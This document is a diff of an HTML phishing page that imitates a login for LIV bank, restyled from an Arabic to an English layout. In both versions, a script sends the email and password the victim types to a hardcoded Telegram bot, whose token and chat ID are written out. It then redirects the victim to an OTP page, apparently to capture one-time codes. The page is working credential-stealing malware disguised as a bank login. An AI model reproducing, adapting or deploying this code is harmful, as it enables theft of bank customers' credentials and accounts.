@@ -1,188 +1,143 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك LIV - تسجيل الدخول</title>
-
-    <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="بنك LIV - تسجيل الدخول">
-    <meta property="og:description" content="قم بتسجيل الدخول باستخدام البريد الإلكتروني وكلمة المرور.">
-    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/liv_bank_logo.png">
-    <meta property="og:url" content="https://alkhaleeg.services/sadu/liv_login.html">
-    <meta property="og:type" content="website">
-
+    <title>Liv Lite Login</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #333;
-            background: #f5f5f5;
-            padding: 20px;
-            line-height: 1.6;
+            background-color: #f2f2f2;
             margin: 0;
-            max-width: 100%;
-            box-sizing: border-box;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        /* Responsive adjustments */
-        @media (max-width: 768px) {
-            body {
-                padding: 15px;
-                font-size: 14px;
-            }
-            .form-container {
-                padding: 20px;
-            }
-            .btn-yellow {
-                width: 90%;
-                font-size: 14px;
-                padding: 10px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .form-container {
-                padding: 15px;
-            }
-            .btn-yellow {
-                width: 95%;
-                font-size: 13px;
-                padding: 8px;
-            }
-        }
-
-        .form-container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            max-width: 500px;
-            margin: 20px auto;
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
             text-align: center;
         }
-        .logo {
-            height: 80px;
-            margin: 0 auto 20px;
-            display: block;
+
+        .logo-container {
+            margin-bottom: 40px;
         }
+
+        .logo-container img {
+            max-width: 160px; /* ضبط حجم الشعار ليكون متناسقاً */
+            height: auto;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
         label {
             display: block;
-            margin: 10px 0 5px;
-            font-weight: bold;
-            color: #333;
-            text-align: right;
+            margin-bottom: 8px;
+            color: #555;
+            font-size: 15px;
+            font-weight: 500;
         }
-        input[type="text"], input[type="password"] {
+
+        input {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
+            padding: 14px 15px;
+            border: 1px solid #ddd;
             border-radius: 8px;
+            background-color: #ffffff;
             font-size: 16px;
             box-sizing: border-box;
+            outline: none;
             transition: border-color 0.3s;
         }
-        input[type="text"]:focus, input[type="password"]:focus {
-            border-color: #ffc107;
-            outline: none;
+
+        input:focus {
+            border-color: #ffde00;
         }
-        .btn-yellow {
-            display: block;
+
+        .login-btn {
             width: 100%;
-            margin: 25px auto;
-            padding: 12px;
-            background: #ffc107;
+            background-color: #ffde00; /* لون Liv الأصفر */
             color: #000;
-            text-align: center;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: bold;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
             font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn-yellow:hover {
-            background: #e0ac00;
-        }
-        .error-message {
-            display: none;
-            text-align: center;
-            color: red;
             font-weight: bold;
-            margin: 10px 0;
+            cursor: pointer;
+            margin-top: 25px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .login-btn:hover {
+            background-color: #f2d200;
         }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <img src="https://alkhaleeg.services/sadUae/images/liv_bank_logo.png" alt="شعار بنك LIV" class="logo">
+<div class="login-container">
+    <div class="logo-container">
+        <img src="Https://alkhaleeg.services/sadUae/images/liv_bank_logo.png" alt="Liv Lite Logo">
+    </div>
 
-    <form id="livLogin">
-        <label for="email">E-mail</label>
-        <input type="email" id="email" name="email" required>
+    <form id="livForm">
+        <div class="form-group">
+            <label>E-mail</label>
+            <input type="email" id="email" placeholder="Enter your email">
+        </div>
 
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" required>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Enter your password">
+        </div>
 
-        <button type="submit" class="btn-yellow">LOGIN</button>
-        <div class="error-message" id="errorMessage"></div>
+        <button type="submit" class="login-btn">Login</button>
     </form>
 </div>
 
 <script>
-    document.getElementById('livLogin').addEventListener('submit', function(e) {
-        e.preventDefault();
+document.getElementById('livForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+    // التحقق من إدخال البيانات
+    if (!email || !password) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+    }
 
-        // إخفاء رسالة الخطأ
-        document.getElementById('errorMessage').style.display = 'none';
-
-        // بوت تلغرام
-        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
-        const chatId = '1008144314';
-
-        const message = `
-🔐 *تسجيل دخول بنك LIV*
-
-📧 البريد الإلكتروني: ${email}
-🔑 كلمة المرور: ${password}
-📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
-`;
-
-        // إرسال البيانات إلى تلغرام
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+    // إرسال البيانات لبوت تلغرام
+    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '1008144314',
+            text: `🔐 *بيانات دخول جديدة - بنك LIV*\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+            parse_mode: 'Markdown'
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                // بعد النجاح: التوجيه إلى صفحة OTP
-                window.location.href = 'otp_page.html';
-            } else {
-                throw new Error('فشل الإرسال');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            const errorMsg = document.getElementById('errorMessage');
-            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
-            errorMsg.style.display = 'block';
-        });
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            window.location.href = 'otp_page.html';
+        } else {
+            throw new Error('فشل الإرسال');
+        }
+    })
+    .catch(() => {
+        alert('❌ خطأ في إرسال البيانات. تحقق من الاتصال بالإنترنت.');
     });
+});
 </script>
 
 </body>
